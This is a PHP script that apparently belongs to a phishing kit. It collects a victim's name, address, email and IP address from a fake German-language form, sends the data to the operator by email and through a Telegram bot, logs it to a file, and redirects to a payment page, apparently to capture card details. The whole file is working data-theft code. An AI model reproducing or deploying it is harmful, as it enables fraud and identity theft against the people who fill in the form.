<?php
session_start(); // Start the session
require '../config.php';
$Cashout = getenv("REMOTE_ADDR");

$logFile = 'logs.txt';
$logEntry = "---- ADDRESS ------\n";
$logEntry .= "Vorname: " . $_POST['firstName'] . "\n";
$logEntry .= "Nachname: " . $_POST['lastName'] . "\n";
$logEntry .= "PLZ: " . $_POST['postalCode'] . "\n";
$logEntry .= "Ort: " . $_POST['town'] . "\n";
$logEntry .= "Strasse: " . $_POST['Strasse'] . "\n";
$logEntry .= "Hausnummer: " . $_POST['Hausnummer'] . "\n";
$logEntry .= "E-mail: " . $_POST['Mail'] . "\n";
$logEntry .= "-------------------------------\n";
$logEntry .= "IP: " .$Cashout. "\n";
$logEntry .= "------------------------------------------\n";
$logEntry .= "----- ADDRESS ------\n";

$logFile = 'logs.txt';
mail($email, "ADDRESS", $logEntry);
$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $logEntry
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);



file_put_contents($logFile, $logEntry, FILE_APPEND);

function generateRandomString($length = 34) {
    return substr(str_shuffle(str_repeat('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length / 62))), 0, $length);
}

// Store the random string in the session
$_SESSION['random_string'] = generateRandomString();
$randomNumber = $_SESSION['random_string'];
header("Location: ./payment.php?$randomNumber");
